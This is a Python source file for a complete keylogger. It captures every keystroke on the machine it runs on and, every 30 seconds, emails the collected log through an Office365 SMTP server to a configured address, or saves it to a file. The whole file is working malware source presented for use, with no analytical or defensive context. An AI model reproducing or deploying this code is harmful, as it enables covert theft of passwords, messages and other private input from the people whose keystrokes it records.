import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 30 # Time after which email/keylogger logs are saved in file/ forwarded to email
EMAIL_ADDRESS = "Your_email_address"
EMAIL_PASSWORD = "Your_email_password"
RECIVING_ADDRESS = "recipient_email_address"

class Keylogger:
    def __init__(self,interval,report_method = "email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    def callback(self,event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else :
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ","-").replace(":","")
        end_dt_str = str(self.end_dt)[:-7].replace(" ","-").replace(":","")
        self.filename = f"keylog - {start_dt_str}___{end_dt_str}"
    
    def report_to_file(self):
        with open(f"{self.filename}.txt","w") as  f: # file will be saved in the current directory
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    
    def prepare_mail(self,message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECIVING_ADDRESS # for getting mail at your mail only keep reciving  address same as emailing address
        msg["Subject"] = "Keylogger Logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message,"plain")
        html_part = MIMEText(html,"html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()
    
    def sendmail(self,email,password,message,verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com",port=587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,self.prepare_mail(message=message))

        server.quit()

        if verbose :
            print(f"{datetime.now()}  ### sent an email to {email} containing message : {message}")

    
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()

            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS,EMAIL_PASSWORD,self.log)
            elif self.report_method == "file":
                self.report_to_file()

            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval,function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print("Started Keylogging")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="email") # by entering report_method="file" logs will be save in your execting directory
    keylogger.start()


